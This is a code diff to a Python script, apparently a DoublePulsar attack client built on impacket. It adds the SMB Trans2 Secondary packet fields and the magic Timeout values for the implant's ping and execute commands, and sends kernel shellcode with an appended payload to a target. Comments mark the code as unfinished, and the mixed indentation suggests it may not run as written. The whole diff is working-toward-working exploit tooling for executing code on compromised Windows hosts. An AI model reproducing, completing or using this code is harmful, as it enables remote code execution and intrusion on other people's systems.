@@ -128,8 +128,15 @@ class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
     )
     
 def send_trans2_ping(conn, tid):
+	#fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Ping packet
+        #CODE IS NOT FINISHED HERE
+        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+
 	pkt = smb.NewSMBPacket()
 	pkt['Tid'] = tid
+	pkt.Flags1 = 0x18
+        pkt.Flags2 = 0xc007
+        pkt.Timeout = 0x0134ee00 #ping command for DoublePulsar
 
 	# assume no params
 
@@ -166,10 +173,15 @@ def send_trans2_ping(conn, tid):
 	conn.sendSMB(pkt)
 	
 def send_trans2_second(conn, tid, xorkey, data):
+	#fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Execute packet
+        #CODE IS NOT FINISHED HERE
+        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+
 	pkt = smb.NewSMBPacket()
 	pkt['Tid'] = tid
-
-	# assume no params
+	pkt.Flags1 = 0x18
+        pkt.Flags2 = 0xc007
+        pkt.Timeout = 0x25891a00 #execute command for DoublePulsar
 
 	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
 	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
@@ -243,15 +255,9 @@ if __name__ == "__main__":
     modified_kernel_shellcode += hex(len(payload_shellcode))
     #add the shellcode after the shellcode size
     modified_kernel_shellcode += payload_shellcode
-
-    #XOR parameters
-    #xor_encrypt(parameters, key)
-
-    #XOR memory buffer
-    #xor_encrypt(modified_kernel_shellcode, key)
   
     #send doublePulsar exec packet
-    send_trans2_second(conn, tid, key, modified_kernel_shellcode, data_displacement_variable)
+    send_trans2_second(conn, tid, key, modified_kernel_shellcode)
     recvPkt = conn.recvSMB()
     retStatus = recvPkt.getNTStatus()
 
